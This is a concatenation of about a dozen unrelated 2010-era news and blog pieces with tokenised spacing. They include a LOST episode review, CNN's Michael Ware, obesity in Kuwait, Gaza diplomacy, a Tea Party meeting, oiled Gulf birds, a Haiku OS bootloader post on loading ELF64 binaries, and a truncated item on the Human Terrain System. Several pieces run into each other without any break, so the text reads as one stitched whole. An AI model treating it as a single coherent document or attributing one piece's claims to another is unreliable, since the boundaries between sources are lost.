But mystically , faithfully , he ’s also the perfect choice , as he truly believes that it ’s his ultimate purpose .
Not a means to an end , not a stop on the journey , but the destination .
Finally , we saw Jack do what so many characters have not been able to – abandon extremes in favor of a middle ground that can yield actual results .
People of the Island , rejoice !
Jacob consecrates
Jack ’s decision by blessing water from the stream , having Jack drink it and declaring – in the same way his own mother did to him eons ago – “ Now you ’re like me .
” Water , water everywhere .
And finally , it was time for Jack to take a drink .
I loved this scene for a lot of reasons , but here ’s my main one : in Season One , Jack hiked into the jungle in search of water when he realized that the bottled supply on the beach was not sustainable .
He found his answer in the caves , where stream water provided a constant cycle of refreshment and sustenance for the people he was tasked with saving .
Last night , that same stream water was given to him to grant eternal life , with the intent that he use its power to continue to save his people and people everywhere by protecting the Island and its light from the smoke monster and its evil .
Jack thus completes the circuit from once - king of a small fledgling empire of castaways to future king of all mankind .
It ’s the reincarnation of Jack ’s fix - it mentality , retooled and refocused for a much broader , more important purpose .
Meet the new Jacob .
“ What They Died For , ” was fittingly all about setting stages , both figurative and literal .
On the Island , the stage was set by the final alignment of our characters toward Good ( led by Jack , with Hurley , Kate , Sawyer and Desmond following ) and Evil ( led by Flocke , with loyal Ben Linus at his disposal ) .
Off the Island , a stage is literally being set for a piano concert starring the son of Jack Shephard and attended by the fate - stricken passengers of Oceanic 815 .
But for a set - up episode , this one delivered more than enough punch for me .
I dug the closure on Widmore and Richard , I dug the development of Ben ’s final mission as Flocke ’s accomplice in exchange for Island dominance , I dug Jack ’s inevitable acceptance of the role of Island Protector .
And I think if you were one of those people who worried about LOST ’s ability to bring closure after last week ’s episode , you were probably converted to a Viewer of Faith last night .
LOST proved it could deliver answers without beating us over the head with it and still deliver an enthralling character - driven episode .
That ’s why , instead of trying to predict how to tonight ’s happenings will play into the end game , I ’ll leave this as an analysis of a stand - alone episode .
An episode with messages about the perils and rewards of faith , the fine line between coincidence and fate , and the very LOSTian worldview that whatever happens , happens .
As players on the board , all we can do is sit back and enjoy the ride .
That ’s what I plan to do until Sunday , when we get to sit back up and enjoy one last offering of the greatest story ever told .
Namaste .

Big loss for CNN : Foreign correspondent Michael Ware , famous for his coverage of the Iraq war , has left the network .
All Things CNN , an independent blog covering the network , writes that Ware has been on leave working on a book and struggling with PTSD from his years of war reporting .
He needed more time off , but his request was denied , and now he 's not coming back , the blog reports .
A CNN spokesperson confirmed to The Huffington Post that Ware has been on leave but declined to comment further than that .
Ware discussed his PTSD in a disturbing December 2008 Men 's Journal piece .
“ I am not the same f**king person , " reads the lede .
It 's unclear exactly how long he 's been on leave , but the last update on his personal website was on Dec. 18 , 2009 .
Ware is a successful and well - loved correspondent , and fans have been getting curious about his absence .
Indeed , All Things CNN writes :
His work for CNN over the past four years has been an astonishing and brutally honest look at the causes and results of war .
Not easy subject matter to watch … but he made us care .
His urgency and passion burst through our television sets and made us pay attention , made us want to understand .
You'd think that given CNN 's ratings troubles it would be doing anything it can to give the viewers what they want .
( CNN ) --
In Kuwait , at family gatherings and social events , food is always at the top of the menu .
Friends meet at restaurants two or three times a week and if you do n't want to go out , Western fast food chains like Burger King will deliver tasty , high - fat meals to your front door .
At family occasions , the more opulent the spread the greater the social status conferred .
Tables groan under the weight of multi-course banquets laid on by competitive hostesses , often aided by maids .
But , in the oil - rich Gulf state where scorching summers keep people indoors , this appetite for excess is taking its toll .
Kuwait is one of the fattest nations on earth -- and it is affecting people 's health .
Just over 74 percent of the population is overweight , according to the World Health Organization ( WHO ) and this " obesity epidemic " is contributing to a rise in heart disease and diabetes .
WHO says around 14 percent of Kuwaitis currently suffer from diabetes and it is on the rise .
" [ Being ] overweight and obesity have been gradually increasing for the past 15 years , " Nawal Al Hamad , Head of Nutrition at Kuwait 's Ministry of Health , told CNN .
The underlying causes are complex , but an abundance of food and sedentary lifestyles are major factors , according to Hamad .
" In Kuwait incomes are good , food is available and not very expensive , and most importantly people do n't move a lot , " she said .
" Our homes are equipped with the usual advanced technology devices , in addition to the fact that we have helpers at home ; even people who are unemployed usually have at least one or two helpers at home , " she added .
Kuwait 's per-capita wealth is one of the highest in the world , while over half the labor force is made up of non-Kuwaitis , according to the CIA World Factbook .
Sami Al Bader is head nutritionist at Gethealthykuwait.com ( GHK ) , a private initiative aimed at helping Kuwaitis to lose weight .
" The figures of overweight people we 've reached in the last five years are very alarming , " he told CNN .
What 's more , GHK has discovered high obesity rates in children .
Just under half of female students are overweight and type - two diabetes -- once known as adult - onset diabetes -- is now affecting children as young as eight .
Bader said the importance of food at Kuwaiti social functions is contributing to the country 's weight problem .
" The new Kuwaiti psyche is very heavily related to restaurants and eating out , " he told CNN .
" At family gatherings food is the number one thing .
Every family occasion in Kuwait is like Thanksgiving .
" The more food you present gives you a bit more status , so people are always presenting more food at all the different occasions , " Bader said .
He added that over the past 20 years more Western products have arrived in the country -- including Western - style fast food .
" In residential areas there are fast food outlets around your homes , " agrees Hamad .
" It is easy to access , whereas when I was young I could n't find it in a residential area , " she said .
Home - delivered fast food is popular .
Some McDonald 's branches offer office - delivery and Burger King and KFC deliver direct to customers ' front doors .
" The sheer number of delivery trucks competing in traffic jams in Kuwait tells me that the populace of Kuwait is very much enjoying the home delivery revolution , " Sumayyah Meehan , an American journalist who has lived in Kuwait for the past 14 years , told CNN .
Meehan recently succumbed to the temptations of home deliveries .
" This past year I found myself on the brink of obesity .
I completely indulged in the fast - food lifestyle prevalent in Kuwait and a great part of that included home delivery , " she said .
Some of the problems Kuwaitis face are down to the hot summers and a lack of alternative activities , according to Meehan .
" There is not much to do in Kuwait besides going shopping and eating out .
The scorching hot summers leave most of Kuwait 's populous languishing at home or racing to the nearest air - conditioned mall , " she said .
And the malls -- as well as schools and offices -- are where GHK hopes to catch Kuwaitis with teams of dieticians who weigh people and give free blood - sugar and cholesterol tests .
GHK is also working with children .
The government , represented by the National Committee for the Prevention of Obesity is also putting healthy food into school canteens , encouraging sport and educating pupils about nutrition .
The aim is to get the next generation of Kuwaitis into healthy habits they 'll carry into adulthood .
" It 's difficult to change attitudes towards food when [ people are ] over 45 or 50 years of age , " said Hamad .
" That 's why we 're targeting the younger generation .
When you start when they are young , maybe they will change . "
Foreign Minister Avigdor Lieberman has invited his Italian counterpart Franco Frattini to head a delegation of European diplomats to the Gaza Strip , Channel Two news reported Thursday .
This proposal marks a striking shift in Israeli policy , which has been to discourage and even prevent foreign officials from visiting the Palestinian territory since Hamas violently wrestled control over Gaza in 2007 .

According to the report , Lieberman suggested that Frattini and the other European diplomats also invest in Gaza 's infrastructure .
Earlier Thursday , the Council of Europe parliamentarians called on Israel to completely end its siege of the Gaza Strip , days after Prime Minister Benjamin Netanyahu ordered an ease of the land blockade , which it imposed in 2007 .
The Council of Europe parliamentarians Thursday called on Israel to completely end its siege of the Gaza Strip , days after Prime Minister Benjamin Netanyahu ordered an ease of the land blockade .
Israel should allow goods to be delivered to the coastal enclave by land and sea , " without prejudice to its own security , " so Palestinians can enjoy " normal living conditions , " said the resolution adopted by a large majority of the Parliamentary Assembly of the Council of Europe ( PACE ) .
PACE , consisting of parliamentarians from the 47 members of the Council of Europe , meets four times a year to debate topical issues and give policy advice to the European Parliament in Strasbourg .
The parliamentarians also criticized the Israeli raid of a Gaza - bound aid flotilla last month as a breach of international law , calling it " manifestly disproportionate . "
The group additionally called on Israel to halt the construction of new settlements in occupied territories and East Jerusalem .
Israel 's recent easing of the Gaza blockade was described as a " first step " by the assembly .
But completely lifting the blockade is " essential " to lower tensions and revive the dialogue between Israelis and Palestinians , the Italian social democrat and assembly rapporteur Piero Fassino said .
As part of its efforts to bring peace to the Middle East , PACE regularly brings together members of the Israeli Knesset and the Palestinian Legislative Council for talks .

Washington ( CNN ) --
Immigration officials will not swoop in to deport a woman whose daughter asked first lady Michelle Obama about " taking people away " if they do n't have proper paperwork , a Department of Homeland Security spokesman said Thursday .
Immigration and Customs Enforcement investigations are based on " solid law enforcement work and not classroom Q and As , " said DHS spokesman Matt Chandler .
Immigration and Customs Enforcement is a part of DHS .
The statement comes after a student concerned about her mother 's legal status asked the first lady about the president 's immigration policies Wednesday .
" My mom said , I think that she says that , Barack Obama is going to take away everybody that does n't have papers , " the young girl told Mrs. Obama as she visited a Washington - area school with Mexican first lady Margarita Zavala .
The unscripted moment was sandwiched between examples of Michelle Obama 's signature policy initiatives -- a lesson on healthy eating and an exercise session -- and forced the first lady to walk the fine line of immigration reform policy language .
" Yeah , well , that 's something that we have to work on , right ?
To make sure that people can be here with the right kind of papers , right ?
That 's exactly right , " she said .
The girl replied , " But my mom does n't have any . "
" [ W ] ell we have to work on that ; we have to fix that and everybody 's got to work together in Congress to make sure that happens .
That 's right , " Obama said before moving to the next question .
Dana Tofig , a spokesman for Montgomery County , Maryland , schools , said the district would not identify the student and does " not ask about the immigration status of our students and their families . "
" There was a Supreme Court decision that makes it clear that if there 's proof of residency in the county , then we educate the child , " Tofig said .
" And we 're not going to identify the student or her parents .
We protect the identity of our students . "
Immigration took center stage in Washington on Wednesday as the president welcomed his Mexican counterpart , Felipe Calderon , to the White House .
Both leaders used the occasion -- the fourth time they have met for bilateral talks -- to take sharp aim at Arizona 's controversial new law meant to crack down on illegal immigrants .
Calderon characterized the measure as discriminatory ; Obama called it a " misdirected expression of frustration . "
Obama also repeated his call for a comprehensive immigration overhaul .

In 1964 , Danish artist Asger Jorn published " The Application of the Triolectical Method in General Situology , " a philosophical tract that rebuked prevailing dialectics .
Nobody knew what the hell he was talking about , so he invented three - sided football to illustrate .
The game , as shown in this kinda - inscrutable but nevertheless interesting clip , is still very much alive today , even though it is almost entirely unknown compared to bourgeois two - team football .

By promoting tertiary systems over binary ones , Jorn sought to replace confrontation with collaboration .

One of the world 's biggest entertainment groups is seeking a student intern to spy on filesharers and monitor messageboards for " pirate groups and other pirate activities " .
Warner Bros Entertainment UK is offering £ 17,500 for the 12 - month position , based in London .
Details of the job have been posted at the University of Manchester 's careers website , where it is listed as " Anti-Piracy Intern " .
A century ago , this would have been a position aboard a merchant navy ship : now it involves lurking in blog comments sections and on IRC chat .
Beginning in July 2010 , the lucky student will be tasked with all the dirty work of a major entertainment group in 2010 .
Besides monitoring internet forums and private BitTorrent sites , the student will be expected to make " trap " purchases of illegal material , to issue copyright infringement notices , and even to develop automated bots that will scan for pirated files .
Warner Bros are looking for applicants studying computer - related degrees , particularly with " internet experience , ideally including peer protocols ... web forums and newsgroups " .
While FTP and IRC knowledge is a bit more specialised , it 's essentially a description of any 18 - year - old geek .
Of course , quite a few 18 - year - old geeks have downloaded an illegal Lady Gaga song here or there .
And so Warner Bros ' job listing does n't make any reference to applicants ' chequered or not - so - chequered pasts .
After all , what better applicants than those who have trolled Rapidshare blogs for the new Caribou album , or who fire up BitTorrent whenever they set about burning a new mix CD ?
Besides , filesharing advocacy groups would love to have a friend on the " inside " .
TorrentFreak has invited its readers to apply for the internship and spy on the spies .
Be quick !
Applications close tomorrow , 31 March .

Modern Warfare 2 Resurgence Pack Release Date Announced
The second multiplayer map pack for Call of Duty : Modern Warfare 2 will be a timed exclusive for the Xbox 360 .
The Resurgence Pack will debut on Xbox Live in June .
The worldwide release date for the Xbox 360 version of this content is June 3rd .
The Stimulus Package , the first map pack for MW2 , was also a timed exclusive for the 360 and arrived on the PS3 and PC about a month later .
I 'd expect a similar delay here as well .
The Resurgence Pack will have five maps .
These maps have n't been identified yet , though .
Considering it 's the same size as the Stimulus Package , it will likely be priced at $ 15 ( 1200 MS Points ) as well .
In honor of the Resurgence Pack 's release , Infinity Ward will host two Double XP weekends soon .
The first begins on May 28th and the second on June 4th .
The meeting room of the local public library was full to bursting , 70 in all : in addition to those sitting in chairs around long tables , attendees spilled over onto steps and stood around the periphery of the room .
The program began with the leader , Mrs. W , declaring in a booming voice , " Welcome , patriots !
There are thousands of us — millions of us ! "
The room beheld her , spellbound .
" What ’s happening is scaring me , " she confided , " so I ’m glad you ’re here so we can do something about it . "
There was no applause , just silence .
A projector had been set up in the center of the room with internet access via a laptop , and there was some delay while Mrs .
W ’s son , who was running the audio- visual component of the program , put it into working order .
A few more minutes of awkward silence passed as Mrs.
W looked out expectantly over the crowd , which sat patiently while her son fumbled with the laptop , crashing it and restarting it at least twice .
Filling in the time , Mrs. W introduced herself as an elementary school teacher and said , " I do n’t know what you ’ve been told , but the news is really not the news and reports things that are n’t true .
Fox Newsand
The New York Timesreport that Tea Partiers are more educated than average and have a higher household income than average , so enjoy . "
These facts were savored in continuing silence .
Finally Mrs. W's son managed to get the video started .
Entitled " We the People , " it was presented as an open letter to President Obama defining the platform of the Tea Party movement .
It was long on crowd - pleasing " patriotic " images of the Statue of Liberty , a scowling bald eagle , mud-caked soldiers , and flapping American flags , but short on substance ( though every word of the spoken narration appeared across the top of the frame like operatic supertitles ) .
When it was over , the crowd applauded warmly , its first apparent visceral reaction of the evening .
Mrs .
W then read the following quote from a Tea Party gathering she had attended the previous week : " We are people who are watching the elephant and the donkey tread on the eagle . "
No clear attribution was given , though it had the effect of eliciting vigorous nods from the audience .
Mrs. W continued , " I read the Constitution , and I ’m not sure I understand a lot of it . "
More nods -- the group was with her .
She then read from the Presidential Oath of Office , " '. . . preserve , protect , and defend the Constitution of the United States . '
They ’re not doing that ! " she declared .
" Now I want to move on to health care . "
She said that health care reform ( though she did not specify whether she was referring to its current state or to the embattled public option ) would result in government - funded " abortions for illegal immigrants and forced participation in abortion by professionals in the medical profession . "
She said that Democrats would try to use some type of wording that was already in the Constitution to claim that abortion was understood to be a constitutional right .
While she was saying this , there was a rustle of paper from the back of the room .
" Wait , I got it ! " yelled a man triumphantly who had been frantically looking up the quote in question .
" The preamble ! "
He read , " ' We , the People of the United States , in order to form a more perfect union , establish justice , insure domestic tranquility , provide for the common defense , promote the general welfare , and secure the blessings of liberty to ourselves and our posterity , do ordain and establish this Constitution for the Untied States of America . '
That ’s what they ’ll say it is : promoting the general welfare ! "
" What ’ll they do next , make you buy a GM car ‘ cause the government owns it ? " chimed in another man .
The room tittered with laughter .
Linda leaned gravely over her lectern and intoned , " This is not about health care .
It ’s about seizing rights ! "
Briskly , she then moved on to introduce a web site called www.icaucus.org in which candidates for state government are presented with questions designed to reveal how closely they agree with the Constitution .
If they score over 70 on the test , the Tea Party movement will endorse them .
Linda explained : " What they do is , they vet — now , I did n’t know what this means , but it means that they question — and I ’m assuming most of you do n’t know what this means , either — they VET the candidates by asking them questions about the Constitution . "
Everywhere heads nodded , strenuously soaking in new and complicated information .
A man standing against the wall , M , spoke up .
" The most important elections are the primaries — this is where we get rid of the incumbents . "
An animated discussion about the role of lobbyists followed , with the bombshell dropped that lobbyist money is pumped back into the system , creating a , a , system where , the money , you know , goes right back into more lobbying ( a self - perpetuating cash flow machine , I thought helpfully , but my telepathy must have been out of range ) .
M concluded , " Stimulus money is being used to buy power , not help people . "
Another man spoke up relevantly : " That ’s why we need to get rid of the income tax ! "
It was time to see another video ( unfortunately , I do n't have a link to this one ) .
More fumbling with the laptop ensued , and this time it proved to be an impossible task to raise the volume beyond a stage whisper .
Mrs .
W's son turned to the crowd and announced the solution : " Everybody be quiet ! "
This video showed how companies give nearly equal amounts of money to both Republican and Democratic candidates .
It was also supertitled , and the graphics were halting and woefully literal ( a declaration that a point was a " red herring " was accompanied by a ClipArt shot of a blood - red fish ) .
The takeaway : Republicans and Democrats are more politically united than they are divided .
More applause .
M spoke again .
" Congress never votes on earmarks , does n’t even know where they come from . "
There was a brief derisive discussion on earmarks , a sin of both parties which the Tea Party will not tolerate .
But then the question arose :
What exactly is the Tea Party ?
" We ’re not talking about a third party , are we ? " piped up another man .
" No , " said Linda .
" If candidates are n’t willing to be vetted — QUESTIONED — do n’t even look at them . "
As an example , she pointed to the name of an Indiana candidate officially endorsed by icaucus.org : " Vote for HIM — he has voted against EVERYTHING !
He sticks to the Constitution ! "
She was referring to Mike Pence .
Another man from the audience spoke up .
" I ’d just like to comment .
You know it ’s a serious meeting when you see all these women here .
Because nothing gets done unless the women give permission .
So I ’d just like to thank all the women here . "
Much applause , laughter , chatter , and batting of eyelashes by all but two of the women in attendance .
Mrs .
W's son took a break from wrestling with the projector to comment that the Tea Party movement is actually an umbrella group for all like - minded local independent groups such as this one , though news coverage might not portray it that way .
His mother chimed in : " Fox News — that ’s the only way you can get any REAL information . "
Murmurs of agreement rose throughout the room .
A man stood up , brandishing two paperback books .
" These should be recommended reading , " he said .
" ‘ The Communist Manifesto ’ by Karl Marx " ( he was received here by whispers of concern ) " and ' Rules for Radicals ’ by Saul Alinsky . "
Linda ’s son dutifully typed out the titles and authors on the laptop projector , spelling Marx ’s name " Carl . "
" We have to know our enemy .
If we do n’t know our enemy , we ca n’t fight ‘em , and the only way we ’ll get to know ‘em is to read their playbooks . "
At this , M spoke up again .
" We are not the KKK without sheets .
We do n’t have a problem with the skin color of the man in the White House .
We have a problem with his policies .
We are fighting an entitlement mentality .
We are trying to break young people of that entitlement mentality . "
At this , I could stay silent no longer .
" Looking around the room , I see mostly mature voters , and I hear the greatest amount of concern being expressed about about taxes .
How do you plan to make this movement appealing to young people , who have very different concerns , and get them excited about what you stand for ? "
Mrs. W , her son , and M all turned to me .
" We have to talk to our kids , and our grandkids , and our neighbor ’s kids , and our kids ’ friends .
We have to tell ‘em what ’s right .
We ca n’t depend on them learning it anywhere else .
We have to understand what we believe and why we believe it . "
" Networking ! " said someone brightly .
" That ’s right ! " said Mrs. W .
Another man from across the room offered , " We have to be willing to engage in dialogue with those who are open to discussion .
And we have to back up everything we say with facts and knowledge of the Constitution . "
" If you want a great book that will help you understand the Constitution , " said yet another avid reader , " Read ‘ The 5,000 - Year Leap ’ by W. Cleon Skousen .
After you read that , you will understand the Constitution so much better . "
Mrs. W , having had to bypass several agenda items due to the robust discussion , quickly moved to close the meeting .
" Our battleground is no longer with rifles , but with voting , " she began , warming up to a grand finish .
My Democratic partner in subversion , K , immediately raised her hand : " If this is a grassroots organization , there must be some concern for not just national and state politics , but local .
What is the group ’s plan to effect change in the local government ? "
" We do n’t know much about local government , " said Mrs. W. " If anyone has any information , email it to me . " K made a note of it .
Getting back to her closing , Mrs. W said , " Prayer is our greatest power .
Pray every day for our nation .
God can do great things .
And our true national leader is God . "
All patriots bowed their heads in prayer , weighed down , as it were , with the task before them .
Whatever that might be .
What I learned : Though I had read it and heard it , nothing beats direct observation .
The people in this room were not merely inexperienced grassroots organizers -- they had no idea how to coalesce a movement , recruit members , articulate a platform , gather and analyze facts , or even operate rudimentary audio- visual equipment .
They had no instincts for critical thinking , preferring instead to be told what to do by authority figures who seem to have information they agree with .
They felt more comfortable relinquishing responsibility for the outcome of events on God than taking responsibility themselves .
Two or three seemed to have the ability to argue more than one side of an issue or to address mainstream perceptions of their efforts .
But overall , they appeared to be looking not for a way to blaze a new trail of political thought , but for validation of an extremely isolated , provincial viewpoint .
Though the experience of sitting in that room was one of the most dismaying in my life , ranking right up there with being told in the delivery room that my epidural had failed , I came away with the conviction that this group was ignorant , annoying , and clueless , but not , ultimately , a threat to democracy , mainstream politics , or the Geek Squad .

( CNN ) --
Some experts see it as a well - meaning flight of fancy .
To others , cleaning a bird soaked with oil from the Gulf of Mexico is the only chance it has for survival .
In the case of the brown pelican , removed last year from the endangered species list , it may be the only way to save the entire lot .
" It 's like triage on a battlefield .
You have to weigh where you can have your best success , " said Ginette Hemley , the World Wildlife Fund 's senior vice president for conservation strategies and science .
Earlier this week , a German biologist painted a less rosy picture in an interview with the magazine Der Spiegel .
Silvia Gaus of the Wattenmeer National Park said it was more humane to euthanize the birds because they will suffer a painful death regardless of whether the oil is scrubbed from their feathers .
" According to serious studies , the middle - term survival rate of oil - soaked birds is under 1 percent , " Gaus told the magazine .
" We , therefore , oppose cleaning birds . "
The statement spotlighted a similar statement in 2002 from the World Wildlife Fund , which said it was reluctant to advise cleaning birds after the Prestige spill off the coast of Spain .
In that incident , a sunken tanker dumped about 20 million gallons of oil off the Galician coast .
The fund issued a statement earlier this week saying its 2002 remarks could not fairly be applied to the situation in the Gulf of Mexico , where researchers have estimated 500,000 to 1.7 million gallons a day have spewed from an underwater well .
Thursday marked Day 52 of the gusher .
" In many cases , WWF believes there is value in trying to clean and rehabilitate wildlife , especially if productive , viable adult animals can recover from exposure to oil , " the release said .
" But every situation is different , and it is too soon to fully calculate the impact the Gulf spill will have on the long - term viability of populations of many species in the region . "
Hemley said it could take up to three years to determine the spill 's total impact on wildlife .
Watch whether BP is keeping workers quiet about birds
According to Wednesday's U.S. Fish and Wildlife Service numbers , rescue officials have collected 1,075 birds .
Of those , 442 were alive and " visibly oiled . "
Another 633 were found dead , and 109 of those were visibly oiled .
The report states BP's Deepwater Horizon spill is not responsible for all dead birds .
" How long will the birds survive that have been cleaned and released ?
We do n't know yet , " Hemley said , explaining it depends on a variety of factors .
Included are the bird's age and size and the length of exposure to the oil , she said .
Lee Hollingsworth , a wildlife adviser with the Royal Society for the Protection of Birds in Wales , said other concerns are the level of saturation and how much oil a bird has ingested .
Seabirds ' feathers are weatherproofed by natural oils , stimulated by a gland in their lower back .
This is why birds nuzzle their tail feathers when they 're preening , Hollingsworth said .
" If that gland is damaged , " he said , " then that no longer secretes oil . "
Holding the birds in captivity to protect them or moving them to a new habitat can be unhealthy for the bird as well , he said .
Captivity is stressful , and changing a bird 's environment introduces it to new prey and predators when it was accustomed to its food and enemies in its natural habitat .
Many birds are quite specialized , he said , and do n't do well in artificial , foreign or zoo - like environs .
See the other eco-casualties of the oil spill
The Welsh society joined the World Wildlife Fund in 2002 , saying that heavily oiled birds could not be helped , but Hollingsworth said Thursday the 8 - year - old statement was specific to the situation in Spain , which happened in chilly November .
The Gulf is warm , which could bode well for the birds , he said .
" The majority of [ birds affected by the Prestige incident ] did n't survive , " he said .
" That , again , is due to the ingestion of oil and weatherproofing . "
Hollingsworth said many people cleaning birds are working for charities that do n't receive much government funding , and it 's important for such groups to prioritize their efforts and target areas where they 'll do the most good .
In the Gulf of Mexico , that may mean focusing on brown pelicans .
The birds , which are native to the Atlantic Coast and eastern Gulf , spent almost 40 years on the endangered species list until last year .
When salvaging just a few birds is so vital to the survival of a species , Hollingsworth said , " something has got to be done , and of course it 's worth saving the bird . "
Despite conflicting studies on the viability of washing birds , there are plenty of success stories .
The International Bird Rescue and Research Center , which is working in the Gulf , cites several examples on its website .
After the 2000 Treasure spill off the coast of South Africa , rescuers saved 21,000 African penguins and released about 19,500 birds back into their colonies , according to the center .
The website notes rescuers also saved 32 snowy plovers after the 1999 New Carissa spill off the Oregon coast , 180 king eiders after a 1996 spill near Alaska 's Pribilof Islands and 175 waterfowl after California 's Santa Clara River spill of 1991 .
" It may seem like a small number but it was significant to us , as we knew what those animals endured being covered in very heavy and thick oil , " wrote Jay Holcomb , the center 's executive director .
Hemley said the wildlife fund would generally " err on the side of recovering birds . "
Though costs can rise when housing or relocating birds , she said it 's not expensive to wash the birds , which involves rinsing them and letting them rest before scrubbing them with Dawn , the dishwashing liquid whose motto once was , " Takes grease out of your way . "
Watch how Dawn works on pelicans
Rescuers are always looking to improve on their methods for saving animals , and they 've learned a lot since the 1969 Santa Barbara oil spill off the coast of Southern California , she said .
" The chances of success increase every time we deal with one of these unfortunate situations , " Hemley said .
" Hopefully we 're getting better at this . "
Getting haiku_loader to play nicely with elves
One of the first steps I ’m taking in setting up x86_64 support for haiku is updating haiku_loader to support elf64 binaries .
I felt like it would be a bit more logical to be able to boot a 64 bit kernel before trying to build one .
There are a few hurdles to jump before haiku_loader is ready to load a 64 bit haiku kernel .
For example , we need to add the code to detect weather a kernel is an elf32 or elf64 binary .
We need to load it accordingly and finally we ’ll need to modify how the kernel_args data structure is handled to support 64 bit pointers .
detecting elf binary type
Detecting the elf binary type is n’t a huge challenge .
In fact it ’s actually the easiest part .
The elf header format has a descriptor that confirms the format .
In haiku , we have a few elf binary related data structures .
One of which is Elf32_ Ehdr …. or the elf 32 header .
( shown below )
struct Elf32_Ehdr { uint8 e_ident [EI_NIDENT ] ; Elf32_Half e_type ; Elf32_Half e_machine ; Elf32 _Word e_version ; Elf32 _Addr e_entry ; Elf32_Off e_phoff ; Elf32_Off e_shoff ; Elf32 _Word e_flags ; Elf32_Half e_ehsize ; Elf32_Half e_phentsize ; Elf32_Half e_phnum ; Elf32_Half e_shentsize ; Elf32_Half e_shnum ; Elf32_Half e_shstrndx ; } ;
If we are to load the header up with data from the binary and we get expected results in the data structure ( specifically in the ident , phoff , and phentsize fields ) then we can assume the binary is an elf32 binary .
This check has been apart of haiku_loader for quiet some time now , but the new addition of haiku_loader is an additional check if the elf32 check fails .
The binary is n’t an elf32 binary we can load the elf header into an elf64 header structure , Elf64 _ Ehdr ( shown below ) and do a similar test to figure out if the binary is a valid elf64 binary .
struct Elf64_Ehdr { uint8 e_ident [EI_NIDENT ] ; Elf64_Half e_type ; Elf64_Half e_machine ; Elf64 _Word e_version ; Elf64 _Addr e_entry ; Elf64_Off e_phoff ; Elf64_Off e_shoff ; Elf64 _Word e_flags ; Elf64_Half e_ehsize ; Elf64_Half e_phentsize ; Elf64_Half e_phnum ; Elf64_Half e_shentsize ; Elf64_Half e_shnum ; Elf64_Half e_shstrndx ; } ;
Now if both tests fail …
We have a problem , but hopefully haiku_loader will determine which elf format the kernel binary is .
loading elf64 binaries
While adding support for loading elf64 binaries to haiku_loader I had to adjust the preloaded_image data structure .
The preloaded_image data structure contained many elf32 specific data structures which would need to be adjusted to support elf64s .
Since we want haiku_loader to be able to load both elf32 and elf64 binaries I had to setup a system where preloaded_image could load data from either elf binary type .
It ’s became quiet clear that I would need preloaded_image to have an elf32 and elf64 header data structure .
I would need it to have 5 more elf related variables in the data structure duplicated .
The solution that I ended up using was quiet simple .
The preloaded_image structure now has a few unnamed unions in it .
The corresponding elf32 and elf64 variables in the data structure are now contained in unnamed unions .
For example , the elf32 and elf64 header variables are contained together in an unnamed union .
Basically , this means that they ’re both contained in the same section of memory overlapping each other .
Consequently ,
This also means you can really only store either the elf32 header or the elf64 header at a single time .
In this case that does n’t matter .
We ’d only need to load either an elf32 or an elf64 at one time .
After completing the data structure it looks some thing like this :
struct preloaded_image { struct preloaded_image * next ; char * name ; uint8 elf_size ; elf_region text_region ; elf_region data_region ; addr_range dynamic_section ; union { struct Elf32 _ Ehdr elf_header ; struct Elf64 _ Ehdr elf_header64 ; } ; union { struct Elf32_Sym *syms ; struct Elf64_Sym * syms64 ; } ; union { struct Elf32 _ Rel * rel ; struct Elf64 _ Rel * rel64 ; } ; int rel_len ; union { struct Elf32_ Rela * rela ; struct Elf64 _ Rela * rela 64 ; } ; int rela_len ; union { struct Elf32 _ Rel * pltrel ; struct Elf64 _ Rel * pltrel64 ; } ; int pltrel_len ; int pltrel_type ; union { struct Elf32_Sym * debug_symbols ; struct Elf64_Sym * debug_symbols64 ; } ; const char * debug_string_table ; uint32 num_debug_symbols , debug_string_table_size ; ino_t inode ; image_id id ; // the ID field will be filled out in the kernel bool is_module ; // set by the module initialization code } ;
After some basic changes to the elf loading code in / src / system / boot / loader / elf.cpp elf64 binaries seem to be getting loaded by haiku_loader …
kernel_args
The final major hurdle that ’s in the way from haiku_loader to support loading an elf64 kernel is the kernel_args data structure .
The kernel_args data structure is filled with 32 bit pointers … which will cause many issues when it ’s passed to the 64bit kernel .
We have haiku_loader running in a 32 bit mode before jumping to the kernel .
This has some benefits .
We ’ll be able to load either 32 bit kernels or 64bit kernels from the loader and we ’re also reusing much of the 32 bit bios code in the bootloader … .
However the main downside of this approach is that the data past to the kernel in kernel_args is from a code that ’s using 32 bit pointers from memory … .
So in either the kernel or haiku_loader we ’ll have to account for that .
This is currently the only part of haiku_loader that I ’m still working on and unsure of what the final solution will be .
Looking at the kernel_args data structure I do n’t think a similar fix with unions , like in preloaded_image , will be possible with kernel_args .
Another possibility , and what I ’m leaning towards right now , is to define a second kernel_args data structure in haiku_loader .
This second data_structure will be equivalent to the kernel_args data structure that ’ll be used by a 64 bit haiku kernel .
If the system detects that it ’ll be loading an elf64 kernel before finally jumping to the kernel it ’ll load up a 64 bit kernel_args data structure with the contents of the normal 32 bit data structure and pass the 64bit structure to the kernel .
after kernel_args is completed
Once kernel_args is finally finished and tested work on a x86_64 kernel can begin , but the updated haiku_loader should n’t be seen as just part of the x86_64 port .
In theory most of these changes will benefit any 64bit haiku port .
The elf64 data structures should be usable on almost any 64bit platform .
The elf64 loading code will be needed for that platform as well .
The only x86_64 specific patch here will be the kernel_args fix .
Since most 64 bit architectures probably wo n’t need to start haiku_loader in a 32 bit mode .

It may be hard to believe , but Steve Spurrier is now eligible to collect social security .
Spurrier is celebrating his 65th birthday by snorkeling in the Bahamas .
And while he claims to be healthier than when he was 25 , the future of the South Carolina coach is n't so certain .
Spurrier was hired by the Gamecocks in 2005 after he spent two unsuccessful years in the NFL with the Washington Redskins .
His arrival created buzz in Columbia , but the results have not been near what he achieved at Florida .
Spurrier 's record the past five seasons is 35 - 28 with one New Year 's Day game among four bowl appearances .
Only one time has South Carolina won eight games and its overall record against Florida and Georgia is 2 - 8 .
Even though he has a contract through 2013 , it would n't be a shock to see Spurrier walk away sooner if the program struggles .
1 May 2010 US Army Generals Not Informed HTS was Spy / Intel Program :
Casualty Rate Excessive by John Stanton
" Let me tell you what HTT is not .
The Team is not an intelligence gathering tool which is used to target individuals . "
Colonel Martin Schweizter , USA , in testimony before the US Congress , April 2008 .
" Deployed HTTs work solely on the non-kinetic side of the military planning and are not involved in the lethal targeting process . "
Steve Fondacaro & Montgomery McFate writing in Men's Journal , February 12 , 2009 Sources report that there are several investigations of HTS underway in addition to the US Army 's AR 15 - 6 effort .
